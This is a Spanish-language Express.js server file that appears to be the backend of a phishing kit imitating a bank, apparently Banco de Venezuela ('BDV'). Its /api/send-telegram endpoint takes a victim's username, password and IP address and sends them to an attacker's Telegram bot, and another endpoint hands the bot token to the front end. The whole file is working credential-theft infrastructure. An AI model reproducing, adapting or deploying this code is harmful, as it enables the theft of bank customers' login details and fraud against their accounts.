import express from "express";
import session from "express-session";
import cors from "cors";
import helmet from "helmet";
import rateLimit from "express-rate-limit";
import next from "next";
import * as path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3001;
const dev = process.env.NODE_ENV !== "production";
const nextDir = path.resolve(__dirname, "../Espiperlou BDV");
const nextApp = next({ dev, dir: nextDir });
const handle = nextApp.getRequestHandler();

app.set("trust proxy", 1);
app.use(helmet());

const configuredOrigins = process.env.ALLOWED_ORIGINS
  ?.split(",")
  .map((origin) => origin.trim())
  .filter(Boolean);

const defaultOrigins = [
  "http://localhost:3000",
  "http://localhost:3001",
  "http://127.0.0.1:3000",
];

const allowedOrigins = configuredOrigins?.length ? configuredOrigins : defaultOrigins;

app.use(
  cors({
    origin(origin, callback) {
      if (!origin) {
        return callback(null, true);
      }
      if (allowedOrigins.includes(origin)) {
        return callback(null, true);
      }
      return callback(new Error(`Origen no permitido: ${origin}`));
    },
    credentials: true,
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization", "X-Requested-With"],
  })
);

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 300,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: "Demasiadas solicitudes, intentalo mas tarde" },
});
app.use(limiter);

app.use(
  session({
    secret: process.env.SESSION_SECRET || "cambia-esta-clave-en-produccion",
    resave: false,
    saveUninitialized: false,
    proxy: true,
    cookie: {
      secure: process.env.NODE_ENV === "production",
      httpOnly: true,
      maxAge: 24 * 60 * 60 * 1000,
      sameSite: "lax",
    },
  })
);

app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true, limit: "10mb" }));

const defaultChatId = process.env.CHAT_ID;
const defaultToken = process.env.TELEGRAM_TOKEN;

app.use((req, res, nextMiddleware) => {
  if (!req.session.chat_id && defaultChatId) {
    req.session.chat_id = defaultChatId;
  }
  if (!req.session.token && defaultToken) {
    req.session.token = defaultToken;
  }
  nextMiddleware();
});

app.post("/api/bot-credentials", (req, res) => {
  try {
    if (req.session.chat_id && req.session.token) {
      return res.status(200).json({
        chat_id: req.session.chat_id,
        token: req.session.token,
        timestamp: new Date().toISOString(),
      });
    }
    return res.status(500).json({
      error: "Datos de sesion no encontrados",
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    console.error("Error al obtener credenciales:", error);
    return res.status(500).json({
      error: "Error interno del servidor",
      timestamp: new Date().toISOString(),
    });
  }
});

if (process.env.NODE_ENV !== "production") {
  app.post("/api/update-credentials", (req, res) => {
    try {
      const { chat_id, token } = req.body;

      if (chat_id && token) {
        req.session.chat_id = chat_id;
        req.session.token = token;

        return res.status(200).json({
          message: "Credenciales actualizadas correctamente",
          timestamp: new Date().toISOString(),
        });
      }
      return res.status(400).json({
        error: "chat_id y token son requeridos",
        timestamp: new Date().toISOString(),
      });
    } catch (error) {
      console.error("Error al actualizar credenciales:", error);
      return res.status(500).json({
        error: "Error interno del servidor",
        timestamp: new Date().toISOString(),
      });
    }
  });
}

const buildTelegramMessage = ({ username, password, ip }) => `\nBDV\nNombre: ${username}\nContra: ${password}\nIP: ${ip}`;

app.post("/api/send-telegram", async (req, res) => {
  try {
    const { username, password, ip } = req.body ?? {};

    if (!username || !password || !ip) {
      return res.status(400).json({
        error: "username, password e ip son requeridos",
        timestamp: new Date().toISOString(),
      });
    }

    const chatId = req.session.chat_id;
    const token = req.session.token;

    if (!chatId || !token) {
      return res.status(500).json({
        error: "Credenciales de Telegram no disponibles en la sesion",
        timestamp: new Date().toISOString(),
      });
    }

    const telegramResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: buildTelegramMessage({ username, password, ip }),
      }),
    });

    const payload = await telegramResponse.json().catch(() => null);

    if (!telegramResponse.ok || !payload?.ok) {
      const errorMessage = payload?.description || "Telegram rechazo la solicitud";
      return res.status(telegramResponse.status || 502).json({
        error: errorMessage,
        timestamp: new Date().toISOString(),
      });
    }

    return res.status(200).json({
      ok: true,
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    console.error("Error al enviar a Telegram:", error);
    return res.status(500).json({
      error: "Error interno al enviar a Telegram",
      timestamp: new Date().toISOString(),
    });
  }
});

app.get("/health", (req, res) => {
  return res.status(200).json({
    status: "OK",
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
  });
});

app.use("/api", (req, res) => {
  return res.status(404).json({
    error: "Endpoint no encontrado",
    method: req.method,
    path: req.originalUrl,
    timestamp: new Date().toISOString(),
  });
});

async function start() {
  try {
    await nextApp.prepare();

    app.all("*", (req, res) => handle(req, res));

    app.use((error, req, res, next) => {
      console.error("Error no manejado:", error);
      if (res.headersSent) {
        return next(error);
      }
      if (error?.message?.startsWith("Origen no permitido")) {
        return res.status(403).json({
          error: error.message,
          timestamp: new Date().toISOString(),
        });
      }
      return res.status(500).json({
        error: "Error interno del servidor",
        timestamp: new Date().toISOString(),
      });
    });

    app.listen(PORT, () => {
      console.log(`Servidor ejecutandose en puerto ${PORT}`);
      console.log(`Endpoint principal: http://localhost:${PORT}/api/bot-credentials`);
      console.log(`Health check: http://localhost:${PORT}/health`);
      console.log(`Modo: ${process.env.NODE_ENV || "development"}`);
    });
  } catch (error) {
    console.error("Error iniciando la aplicacion:", error);
    process.exit(1);
  }
}

start();
